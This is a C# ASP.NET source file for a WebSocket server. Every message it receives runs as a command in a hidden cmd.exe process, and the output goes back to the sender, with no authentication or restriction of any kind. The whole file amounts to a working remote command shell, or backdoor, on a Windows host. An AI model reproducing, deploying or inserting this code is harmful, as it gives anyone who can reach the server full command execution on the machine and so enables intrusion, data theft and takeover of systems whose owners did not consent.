using System.Diagnostics;
using System.Net;
using System.Net.WebSockets;
using System.Text;

var builder = WebApplication.CreateBuilder(args);
var app = builder.Build();

app.UseWebSockets();

var buffer = new byte[256];
app.Map("/", async context =>
{
    if (!context.WebSockets.IsWebSocketRequest)
        context.Response.StatusCode = (int)HttpStatusCode.BadRequest;
    else
    {
        using var webSocket = await context.WebSockets.AcceptWebSocketAsync();
        while (true)
        {

            var resultSocket = await webSocket.ReceiveAsync(buffer, CancellationToken.None);

            var command = Encoding.ASCII.GetString(buffer, 0, resultSocket.Count).ToLower();

            var retornoCommand = ExecuteCommand(command);

            await webSocket.SendAsync(
                Encoding.ASCII.GetBytes(retornoCommand),
                WebSocketMessageType.Text,
                true,
                CancellationToken.None);

            await Task.Delay(1000);
        }
    }
});


string ExecuteCommand(string command)
{
    Process cmd = new Process();
    cmd.StartInfo.FileName = "cmd.exe";
    cmd.StartInfo.RedirectStandardInput = true;
    cmd.StartInfo.RedirectStandardOutput = true;
    cmd.StartInfo.CreateNoWindow = true;
    cmd.StartInfo.UseShellExecute = false;
    cmd.Start();

    cmd.StandardInput.WriteLine(command);
    cmd.StandardInput.Flush();
    cmd.StandardInput.Close();
    cmd.WaitForExit();

    return cmd.StandardOutput.ReadToEnd();
}

await app.RunAsync();